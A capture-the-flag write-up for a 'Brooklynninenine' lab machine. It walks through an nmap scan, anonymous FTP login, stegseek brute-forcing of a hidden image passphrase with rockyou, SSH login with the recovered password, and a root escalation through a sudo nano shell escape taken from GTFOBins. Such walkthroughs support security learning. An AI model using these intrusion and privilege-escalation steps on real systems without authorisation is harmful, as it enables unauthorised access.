---
title: Brooklynninenine Writeup
---

Add host to `/etc/hosts`:
![[Pasted image 20260527191939.png]]

Run `Nmap`:
```bash
sudo nmap -sS -sV -p- -oN scan.txt 10.49.178.205
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's visit `ftp` for anonymous login:
```bash
mongkol@mongkol:~/Desktop/ctf/brooklyn$ ftp 10.49.178.205
Connected to 10.49.178.205.
220 (vsFTPd 3.0.3)
Name (10.49.178.205:mongkol): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36226|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||62751|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |************************************************************************************************************|   119      151.90 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (1.30 KiB/s)
```

Read the note:
![[Pasted image 20260527192245.png]]
We get 3 users (`Amy, Jake, Holt`).

Let's visit the site:
![[Pasted image 20260527191920.png]]

In developer tools, We see a comment:
![[Pasted image 20260527192349.png]]

Something we have to do with the image, let's save it and check something out:
```bash
mongkol@mongkol:~/Desktop/ctf/brooklyn$ exiftool brooklyn99.jpg
ExifTool Version Number         : 12.76
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2026:05:27 18:57:21+07:00
File Access Date/Time           : 2026:05:27 18:59:43+07:00
File Inode Change Date/Time     : 2026:05:27 18:57:21+07:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```
`Exiftool` shows nothing interesing. `strings` shows nothing interesting.

Running `steghide` requires a passphrase. That's something:
![[Pasted image 20260527192600.png]]

Let's brute force it with `rockyou`:
```bash
mongkol@mongkol:~/Desktop/ctf/brooklyn$ stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

JACKPOT, let's read the output:
```bash
mongkol@mongkol:~/Desktop/ctf/brooklyn$ cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

We got `holt`'s password, let's `ssh` and get the `user.txt` flag:
```bash
ssh holt@10.49.178.205
```
![[Pasted image 20260527193121.png]]

Let's run `sudo -l` to see what we can do:
![[Pasted image 20260527193156.png]]

We can `nano` as root, let's check GTFOBins for clues:
![[Pasted image 20260527193251.png]]

Let's try it. run `sudo /bin/nano` --> Ctrl R, Ctrl X --> `reset; sh 1>&0 2>&0`:
![[Pasted image 20260527193435.png]]
![[Pasted image 20260527193501.png]]


